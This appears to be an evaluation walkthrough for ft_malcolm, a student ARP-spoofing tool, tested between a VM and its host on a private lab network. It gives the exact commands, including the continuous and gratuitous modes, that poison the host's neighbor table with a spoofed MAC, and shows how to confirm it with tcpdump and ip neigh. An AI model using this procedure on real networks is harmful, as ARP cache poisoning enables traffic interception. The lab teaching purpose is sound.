# Short evaluation

| | |
|---|---|
| VM ip (source) | `192.168.65.14` |
| host IP (target) | `192.168.65.15` |
| host mac | `aa:77:fb:2e:e0:aa` |
| spoof mac | `aa:bb:cc:dd:ee:ff` |
| interface | `enp0s1` |

On each machine, MAC and IPv4:

```bash
ip -br link
ip -4 -br addr
```

`ip -br link` prints the interface and its MAC. `ip -4 -br addr` prints the IPv4 address. The full `ip addr` also lists IPv6 addresses; those are not the MAC.

Second terminal on VM1. Leave it running.

```bash
sudo tcpdump -vv -i enp0s1 arp
```

| Part | Meaning |
|---|---|
| `sudo` | Capture on a real interface needs root |
| `-vv` | Verbose ARP decode: hardware type, protocol type, and their lengths |
| `-i enp0s1` | Listen on this interface |
| `arp` | Filter. Only ARP packets are printed |

Right after start, before any ARP on the wire:

```text
tcpdump: listening on enp0s1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

The process then waits. Silence here means no ARP yet.

After `arping` or `ping` from the host, two lines appear. The reply MAC is the spoofed one:

```text
ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.65.14 tell 192.168.65.15, length 28
ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.65.14 is-at aa:bb:cc:dd:ee:ff, length 28
```

The VM kernel may also answer for its own IP. That extra reply carries the real MAC of `enp0s1` on VM1, from `ip -br link`.

On the host, clear the neighbor table (the ARP cache):

```bash
sudo ip neigh flush all
```

| Part | Meaning |
|---|---|
| `sudo` | Changing the neighbor table needs root |
| `neigh` | The neighbor table: IPv4 entries are ARP |
| `flush` | Delete matching entries |
| `all` | Every entry, on every interface |

Deleted entries are printed one per line. An empty table prints nothing. `arp -a` and `ip neigh` then show no `192.168.65.14` line until the host asks for that address again.

---

## Repository

```bash
type ft_malcolm
alias | grep -E 'ft_malcolm|tcpdump|arp|make'
```

No `malloc` in the project. `getifaddrs` / `getaddrinfo` are released with `freeifaddrs` / `freeaddrinfo`.

```bash
sudo valgrind --leak-check=full ./ft_malcolm
```

---

## User permissions

Without root the program prints that root is required and exits.

```bash
./ft_malcolm 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

```text
ft_malcolm: must be run as root
```

As root with no arguments it prints usage and exits.

```bash
sudo ./ft_malcolm
```

```text
Usage: ft_malcolm [-v] [-c] [-g] [-i interface] <source_ip> <source_mac> <target_ip> <target_mac>
```

---

## Spoof

`ft_malcolm` runs on VM1 (`192.168.65.14`). The host (`192.168.65.15`) is the machine whose neighbor table changes. The neighbor table is the ARP cache: an IP and the MAC the kernel will use for it.

Read it on the host:

```bash
ip neigh show 192.168.65.14
```

`arp -a` prints the same table. No line means the host has no MAC stored for `192.168.65.14`.

Arguments of `ft_malcolm`, in order: source IP to impersonate, MAC to store for that IP, host IP, host MAC.

### 1. Start the program on VM1

```bash
sudo ./ft_malcolm 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

It prints `Found available interface: enp0s1` and waits. It sends nothing until it sees a broadcast ARP request from `192.168.65.15` asking who has `192.168.65.14`.

### 2. Send that request from the host

```bash
arping -c 1 -I enp0s1 192.168.65.14
```

| Part | Meaning |
|---|---|
| `-c 1` | Send one request |
| `-I enp0s1` | Send it from this interface |
| `192.168.65.14` | The IP to resolve: who has this address |

`arping` emits "who-has `192.168.65.14`, tell `192.168.65.15`". That is the request `ft_malcolm` is waiting for.

### 3. The program exits. The host table stays empty

On VM1 the process prints the request, sends one reply, and exits:

```text
An ARP request has been broadcast.
mac address of request: aa:77:fb:2e:e0:aa
IP address of request: 192.168.65.15
Now sending an ARP reply to the target address with spoofed source, please wait...
Sent an ARP reply packet, you may now check the arp table on the target.
Exiting program...
```

`tcpdump` on VM1 shows the request, then `Reply 192.168.65.14 is-at aa:bb:cc:dd:ee:ff`.

On the host, read the table again:

```bash
ip neigh show 192.168.65.14
```

There is still no line. `arping` sends and reads ARP from userspace. The host kernel does not copy that reply into its neighbor table. The exit is the normal end of a single reply. The proof at this step is the `tcpdump` line, not `ip neigh`.

### 4. Make the host kernel store the MAC

The kernel writes a neighbor entry when it asks for the MAC itself. `ping` does that. The VM kernel also answers for `192.168.65.14`, with the real MAC of `enp0s1`. One spoofed reply can lose to that answer, so `-c` keeps `ft_malcolm` replying to every matching request until you stop it.

On VM1, leave this running:

```bash
sudo ./ft_malcolm -c 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

On the host, while that process is still up:

```bash
ping -c 1 -W 1 192.168.65.14
ip neigh show 192.168.65.14
```

| Part | Meaning |
|---|---|
| `ping -c 1` | One echo request. The kernel sends ARP first, because it has no MAC for this IP |
| `-W 1` | Wait at most 1 second for the echo reply |

The neighbor line:

```text
192.168.65.14 dev enp0s1 lladdr aa:bb:cc:dd:ee:ff REACHABLE
```

`lladdr` is the stored MAC. `ping` itself can time out: nothing answers ICMP at `aa:bb:cc:dd:ee:ff`. The check is the `lladdr` line.

If `lladdr` is the real MAC of VM1, the VM kernel answered last. Run `ping -c 1 -W 1 192.168.65.14` again. `-c` is still running, so `ft_malcolm` answers again.

### 5. Stop VM1 and read the table once more

Ctrl+C on VM1. It prints `Exiting program...`. On the host, without another `ping`:

```bash
ip neigh show 192.168.65.14
```

The line still shows `aa:bb:cc:dd:ee:ff`. A new `ping` makes the host ask again. The VM kernel then answers with its real MAC, and that MAC replaces the spoofed one.

---

## Errors

The program exits at once and prints a short message.

```bash
sudo ./ft_malcolm 10.11.11.1111 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
sudo ./ft_malcolm 192.168.65.14 aaa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

```text
ft_malcolm: unknown host or invalid IP address: (10.11.11.1111).
ft_malcolm: invalid mac address: (aaa:bb:cc:dd:ee:ff)
```

---

## Decimal IPv4

`3232252174` is `192.168.65.14`. The program starts and waits. Ctrl+C stops it.

```bash
sudo ./ft_malcolm 3232252174 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

## Hostname

An unknown name fails immediately.

```bash
sudo ./ft_malcolm 192.168.65.14 aa:bb:cc:dd:ee:ff nonexistent.invalid.host aa:77:fb:2e:e0:aa
```

```text
ft_malcolm: unknown host or invalid IP address: (nonexistent.invalid.host).
```

## Verbose

On VM1:

```bash
sudo ./ft_malcolm -v 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

On the host:

```bash
arping -c 1 -I enp0s1 192.168.65.14
```

Output includes the Ethernet header, the ARP header, and a hex dump. The program then exits. The long form is `--verbose`.

## Continuous

Several requests, and the process stays up. Ctrl+C stops it. The long form is `--continuous`.

```bash
sudo ./ft_malcolm -c 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

```bash
arping -c 5 -I enp0s1 192.168.65.14
```

## Gratuitous ARP

One broadcast reply, then the process exits. `tcpdump` shows `aa:bb:cc:dd:ee:ff > Broadcast` and `Reply 192.168.65.14 is-at aa:bb:cc:dd:ee:ff`. The long form is `--gratuitous`.

```bash
sudo ./ft_malcolm -g 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

## Interface

```bash
sudo ./ft_malcolm -i enp0s1 192.168.65.14 aa:bb:cc:dd:ee:ff 192.168.65.15 aa:77:fb:2e:e0:aa
```

```text
Found available interface: enp0s1
```

Ctrl+C stops it.
